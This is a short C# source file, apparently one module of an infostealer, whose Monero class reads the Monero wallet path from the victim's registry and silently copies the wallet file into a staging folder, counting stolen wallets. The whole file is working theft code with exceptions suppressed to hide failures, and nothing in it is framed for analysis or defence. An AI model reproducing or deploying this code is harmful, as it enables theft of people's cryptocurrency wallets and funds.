using System.IO;
using Microsoft.Win32;

namespace exos;

internal class Monero
{
	public static int count = 0;

	public static string base64xmr = "\\Wallets\\Monero\\";

	public static void XMRcoinStr(string directorypath)
	{
		try
		{
			RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core");
			Directory.CreateDirectory(directorypath + base64xmr);
			string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
			Directory.CreateDirectory(directorypath + base64xmr);
			File.Copy(text, directorypath + base64xmr + text.Split(new char[1] { '\\' })[text.Split(new char[1] { '\\' }).Length - 1]);
			count++;
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
